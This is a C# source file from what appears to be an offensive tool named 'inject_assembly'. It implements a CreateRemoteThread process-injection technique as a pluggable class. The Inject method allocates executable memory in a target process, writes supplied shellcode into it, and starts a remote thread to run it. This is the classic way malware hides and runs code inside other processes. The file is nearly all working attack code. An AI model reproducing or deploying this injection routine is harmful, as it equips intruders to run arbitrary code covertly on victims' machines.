using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace inject_assembly.Techniques
{
    public class CRT : ITechnique
    {
        public CRT()
        {

        }

        public bool Inject(byte[] shellcode, IntPtr hTarget)
        {
            // allocate some memory for our shellcode
            IntPtr pAddr = Native.VirtualAllocEx(hTarget, IntPtr.Zero, (UInt32)shellcode.Length, Native.AllocationType.Commit | Native.AllocationType.Reserve, Native.MemoryProtection.PAGE_EXECUTE_READWRITE);

            // write the shellcode into the allocated memory
            Native.WriteProcessMemory(hTarget, pAddr, shellcode, shellcode.Length, out IntPtr lpNumberOfBytesWritten);

            // create the remote thread
            IntPtr hThread = Native.CreateRemoteThread(hTarget, IntPtr.Zero, 0, pAddr, IntPtr.Zero, Native.ThreadCreationFlags.NORMAL, out hThread);

            if (hThread == IntPtr.Zero) { return false; }

            return true;
        }
    }
}
